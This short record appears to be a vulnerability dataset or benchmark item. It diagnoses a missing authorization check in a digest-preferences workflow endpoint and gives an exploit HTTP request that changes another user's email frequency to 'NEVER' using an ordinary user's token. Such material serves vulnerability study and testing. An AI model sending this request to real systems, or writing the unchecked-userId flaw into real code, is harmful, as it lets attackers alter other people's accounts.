diagnosis: The activity updates user communication digest preferences in user_preferences based on input.userId without validating whether the workflow was scheduled by the user or an authorized admin, permitting unauthorized modification of communication frequencies on arbitrary accounts.
exploit_request:
POST /api/workflows/preferences/digest HTTP/1.1
Host: settings.communityplatform.org
Authorization: Bearer <user_jwt>
Content-Type: application/json

{"userId": "usr_random_member_4491", "frequency": "NEVER"}
